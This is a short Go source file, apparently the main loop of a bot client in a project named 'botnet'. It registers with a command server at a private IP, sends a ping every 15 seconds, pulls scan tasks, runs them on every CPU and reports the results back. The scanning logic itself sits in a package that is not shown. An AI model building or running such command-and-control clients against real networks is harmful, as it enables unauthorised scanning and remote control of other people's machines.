package main

import (
	"log"
	"time"

	"example.com/botnet/bot"
)

func main() {
	sys := &bot.LinuxSystem{}
	sys.Init()

	tasker := bot.TaskerProxy{Url: "http://10.1.1.80:5000"}
	tracker := bot.TrackerProxy{Url: "http://10.1.1.80:5000"}

	//tracker := bot.MockTracker{}
	//tasker := bot.MockTasker{`{"id": "1", "ip": "", "port": "8000", "type": "scan"}`}

	mbot := bot.CreateBotInstance(sys)

	for {
		if mbot.Getuuid() != "" {
			break
		}
		mbot.Ping(tracker)
		time.Sleep(5*time.Second)
	}
	go func() {
		for {
			time.Sleep(15 * time.Second)
			mbot.Ping(tracker)
		}
	}()

	log.Printf("#Bot, got %d cpu, %d ram", sys.Ncpu, sys.Ram)

	results := make(chan bot.Result, sys.Ncpu)

	go func() {
		defer close(results)
		// channel is blocking
		// so this will persist till the channel gets closed elsewhere
		for result := range results {
			log.Println(result)
			tasker.Report(result, mbot)
		}
	}()

	for {
		for i := 0; i < sys.Ncpu; i++ {
			go func() {
				result := mbot.Work(bot.ScanRecipe{}, tasker.Next())
				results <- result
			}()
		}
		time.Sleep(5 * time.Second)
	}
}
